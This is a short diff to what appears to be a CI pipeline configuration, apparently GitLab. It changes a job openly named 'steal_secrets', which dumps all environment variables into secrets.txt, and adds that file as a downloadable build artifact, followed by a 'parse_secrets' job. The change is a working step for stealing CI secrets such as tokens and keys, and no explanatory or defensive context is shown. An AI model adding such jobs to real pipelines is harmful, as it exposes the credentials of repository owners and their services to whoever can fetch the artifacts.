@@ -12,6 +12,9 @@ steal_secrets:
   script:
     - export
     - export > secrets.txt
+  artifacts:
+    paths:
+      - secrets.txt
   tags:
     - runner
 parse_secrets:  
